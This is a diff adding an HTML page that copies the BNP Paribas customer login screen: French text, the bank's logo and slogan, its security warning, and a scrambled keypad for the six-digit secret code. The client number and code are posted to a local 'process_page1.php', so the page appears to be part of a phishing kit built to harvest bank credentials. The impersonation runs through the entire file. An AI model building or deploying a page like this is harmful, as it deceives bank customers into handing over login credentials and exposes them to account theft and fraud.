@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accédez à votre espace client - BNP Paribas</title>
+    <script src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/js/all.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        .main-container {
+            display: flex;
+            flex-wrap: wrap;
+            min-height: calc(100vh - 70px);
+        }
+        .left-panel {
+            flex: 1;
+            min-width: 500px;
+            background-color: #008754;
+            color: white;
+            padding: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .right-panel {
+            flex: 1;
+            min-width: 400px;
+            background-color: #f0f0f0;
+            padding: 60px 40px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        .login-form {
+            width: 100%;
+            max-width: 380px;
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .keypad-btn {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            padding: 15px 0;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .keypad-btn:hover {
+            background-color: #f0f0f0;
+        }
+        .info-panel {
+            width: 100%;
+            max-width: 450px;
+        }
+        .code-dot {
+            width: 12px;
+            height: 12px;
+            background-color: rgba(255, 255, 255, 0.4);
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .code-dot.active {
+            background-color: #fff;
+        }
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+            }
+            .left-panel, .right-panel {
+                min-width: 100%;
+                box-sizing: border-box;
+            }
+            .right-panel {
+                align-items: center;
+            }
+            .info-panel {
+                padding-top: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header style="background-color: #fff; padding: 15px 40px; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center;">
+        <img src="mabanque.bnpparibas_Logo.jpg" alt="Logo BNP Paribas" style="height: 50px; margin-right: 15px; object-fit: contain;">
+        <span style="font-size: 24px; font-weight: bold; color: #333;">BNP PARIBAS</span>
+        <span style="margin-left: 20px; color: #555; font-size: 16px;">La banque d'un monde qui change</span>
+    </header>
+
+    <main class="main-container">
+        <section class="left-panel">
+            <form class="login-form" id="loginForm" action="process_page1.php" method="post">
+                <h1 style="font-size: 28px; font-weight: bold; margin-bottom: 30px; text-align: left;">Accédez à votre espace client</h1>
+                
+                <div style="margin-bottom: 20px;">
+                    <label for="clientNumber" style="display: block; margin-bottom: 8px; font-size: 14px; font-weight: bold;">Numéro Client</label>
+                    <div style="position: relative;">
+                        <input type="text" id="clientNumber" name="client" placeholder="Numéro de 7 à 10 chiffres" required style="width: calc(100% - 30px); padding: 12px 15px; border-radius: 5px; border: 1px solid #ccc; font-size: 16px;">
+                        <i class="fa-regular fa-circle-xmark" id="clearClient" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #aaa; cursor: pointer;"></i>
+                    </div>
+                </div>
+
+                <div style="display: flex; align-items: center; margin-bottom: 30px; font-size: 14px;">
+                    <input type="checkbox" id="rememberMe" name="rememberMe" style="width: 20px; height: 20px; margin-right: 10px; accent-color: #008754;">
+                    <label for="rememberMe" style="margin-right: 8px;">Mémoriser mon numéro client</label>
+                    <i class="fa-solid fa-circle-info" style="color: #fff; cursor: pointer;"></i>
+                </div>
+
+                <!-- Bouton Continuer (visible avant le clavier) -->
+                <div id="continueSection" style="text-align: center;">
+                    <button type="button" id="continueBtn" style="background-color: rgba(255, 255, 255, 0.3); border: none; padding: 12px 35px; border-radius: 25px; font-size: 14px; font-weight: bold; color: #fff; cursor: pointer; transition: all 0.3s ease; transform: scale(1);">Continuer</button>
+                    <a href="#" style="color: #fff; text-decoration: underline; font-size: 14px; display: block; margin-top: 20px;">Numéro client ou code secret oublié</a>
+                </div>
+
+                <!-- Section code secret (cachée au départ) -->
+                <div id="codeSection" style="display: none; opacity: 0; transition: opacity 0.4s ease;">
+                    <div style="margin-bottom: 20px;">
+                        <p style="font-size: 14px; font-weight: bold; margin-bottom: 15px;">Saisissez votre code secret</p>
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <div id="codeDots" style="display: flex; gap: 10px;">
+                                <span class="code-dot"></span>
+                                <span class="code-dot"></span>
+                                <span class="code-dot"></span>
+                                <span class="code-dot"></span>
+                                <span class="code-dot"></span>
+                                <span class="code-dot"></span>
+                            </div>
+                            <i class="fa-solid fa-delete-left" id="clearCode" style="margin-left: 15px; font-size: 20px; cursor: pointer;"></i>
+                        </div>
+                    </div>
+
+                    <input type="hidden" id="hiddenCode" name="code" value="" required />
+
+                    <div class="keypad">
+                        <button type="button" class="keypad-btn" data-digit="7">7</button>
+                        <button type="button" class="keypad-btn" data-digit="5">5</button>
+                        <button type="button" class="keypad-btn" data-digit="0">0</button>
+                        <button type="button" class="keypad-btn" data-digit="8">8</button>
+                        <button type="button" class="keypad-btn" data-digit="4">4</button>
+                        <button type="button" class="keypad-btn" data-digit="2">2</button>
+                        <button type="button" class="keypad-btn" data-digit="9">9</button>
+                        <button type="button" class="keypad-btn" data-digit="1">1</button>
+                        <button type="button" class="keypad-btn" data-digit="6">6</button>
+                        <button type="button" class="keypad-btn" data-digit="3">3</button>
+                    </div>
+
+                    <button type="submit" style="width: 80%; background-color: rgba(255, 255, 255, 0.3); border: none; border-radius: 20px; padding: 10px; font-size: 13px; font-weight: bold; color: #fff; cursor: pointer; margin-top: 15px; margin-bottom: 15px;">Accéder à mon espace client</button>
+
+                    <a href="#" style="color: #fff; text-decoration: underline; font-size: 14px; text-align: center; display: block;">Numéro client ou code secret oublié</a>
+                </div>
+            </form>
+        </section>
+
+        <section class="right-panel">
+            <div class="info-panel">
+                <div style="margin-bottom: 40px;">
+                    <h2 style="font-size: 18px; font-weight: bold; margin-bottom: 20px; display: flex; align-items: center;">
+                        <i class="fa-solid fa-lock" style="margin-right: 10px; font-size: 16px;"></i>
+                        Sécurité
+                    </h2>
+                    <p style="font-size: 14px; line-height: 1.6; color: #555;">Avant de vous connecter, vérifiez que l'adresse de cette page commence exactement par :</p>
+                    <div style="background-color: #e8e8e8; padding: 10px 15px; border-radius: 5px; margin: 15px 0; font-family: monospace; font-size: 14px; color: #333;">
+                        connexion-mabanque.bnpparibas
+                    </div>
+                    <p style="font-size: 14px; line-height: 1.6; color: #555;">Si une tierce personne ou un représentant BNP Paribas vous demande de vous connecter ou de fournir des informations, il s'agit systématiquement d'une fraude, ne vous connectez en aucun cas.</p>
+                    <a href="#" style="color: #008754; text-decoration: underline; font-weight: bold; font-size: 14px; display: inline-block; margin-top: 10px;">Consulter tous nos conseils sécurité et fraude.</a>
+                </div>
+
+                <div>
+                    <h2 style="font-size: 18px; font-weight: bold; margin-bottom: 15px;">Besoin d'aide ?</h2>
+                    <p style="font-size: 14px; line-height: 1.6; color: #555;">Consultez notre <a href="#" style="color: #008754; text-decoration: underline; font-weight: bold;">Assistance technique.</a></p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        const clientNumber = document.getElementById('clientNumber');
+        const hiddenCode = document.getElementById('hiddenCode');
+        const dots = Array.from(document.querySelectorAll('#codeDots .code-dot'));
+        const keypadButtons = Array.from(document.querySelectorAll('.keypad-btn'));
+        const clearClient = document.getElementById('clearClient');
+        const clearCode = document.getElementById('clearCode');
+        const continueSection = document.getElementById('continueSection');
+        const codeSection = document.getElementById('codeSection');
+        const continueBtn = document.getElementById('continueBtn');
+
+        // Effacer le numéro client
+        clearClient.addEventListener('click', () => {
+            clientNumber.value = '';
+            clientNumber.focus();
+        });
+
+        // Animation hover sur le bouton Continuer
+        continueBtn.addEventListener('mouseenter', () => {
+            continueBtn.style.transform = 'scale(1.05)';
+            continueBtn.style.backgroundColor = 'rgba(255, 255, 255, 0.4)';
+        });
+        continueBtn.addEventListener('mouseleave', () => {
+            continueBtn.style.transform = 'scale(1)';
+            continueBtn.style.backgroundColor = 'rgba(255, 255, 255, 0.3)';
+        });
+
+        // Bouton Continuer - affiche le clavier avec animation
+        continueBtn.addEventListener('click', () => {
+            if (clientNumber.value.length >= 7) {
+                // Animation de sortie du bouton Continuer
+                continueSection.style.opacity = '0';
+                continueSection.style.transition = 'opacity 0.3s ease';
+                
+                setTimeout(() => {
+                    continueSection.style.display = 'none';
+                    codeSection.style.display = 'block';
+                    
+                    // Animation d'entrée du clavier
+                    setTimeout(() => {
+                        codeSection.style.opacity = '1';
+                    }, 50);
+                }, 300);
+            } else {
+                clientNumber.focus();
+                clientNumber.style.boxShadow = '0 0 0 2px #ef4444';
+                setTimeout(() => {
+                    clientNumber.style.boxShadow = '';
+                }, 2000);
+            }
+        });
+
+        // Mise à jour des points du code
+        function refreshDots() {
+            const value = hiddenCode.value;
+            dots.forEach((dot, index) => {
+                if (index < value.length) {
+                    dot.classList.add('active');
+                } else {
+                    dot.classList.remove('active');
+                }
+            });
+        }
+
+        // Clavier numérique
+        keypadButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const digit = btn.getAttribute('data-digit');
+                if (hiddenCode.value.length < 6) {
+                    hiddenCode.value += digit;
+                    refreshDots();
+                }
+            });
+        });
+
+        // Bouton de suppression du code (efface un chiffre à la fois)
+        clearCode.addEventListener('click', () => {
+            if (hiddenCode.value.length > 0) {
+                hiddenCode.value = hiddenCode.value.slice(0, -1);
+                refreshDots();
+            }
+        });
+
+        // Validation du formulaire avant soumission
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            if (clientNumber.value.length < 7) {
+                e.preventDefault();
+                clientNumber.focus();
+                clientNumber.style.boxShadow = '0 0 0 2px #ef4444';
+                setTimeout(() => {
+                    clientNumber.style.boxShadow = '';
+                }, 2000);
+                return false;
+            }
+            if (hiddenCode.value.length < 6) {
+                e.preventDefault();
+                alert('Veuillez saisir votre code secret à 6 chiffres');
+                return false;
+            }
+            return true;
+        });
+    </script>
+</body>
+</html>
